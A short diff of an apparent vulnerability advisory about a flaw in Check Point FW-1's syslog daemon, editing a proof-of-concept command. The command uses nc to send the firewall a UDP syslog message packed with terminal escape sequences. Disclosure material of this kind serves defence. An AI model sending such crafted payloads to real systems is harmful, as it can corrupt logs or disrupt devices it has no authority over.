@@ -4,6 +4,6 @@ An issue has been discovered in Check Point FW-1 syslog daemon when attempting t
 
 The technical details regarding this issue are currently unknown. This BID will be updated when further information becomes available.
 
-[attacker]# echo -e "<189>19: 00:01:04:
+[attacker]# echo "<189>19: 00:01:04:
 Test\a\033[2J\033[2;5m\033[1;31mHACKER~
 ATTACK\033[2;25m\033[22;30m\033[3q" | nc -u firewall 514
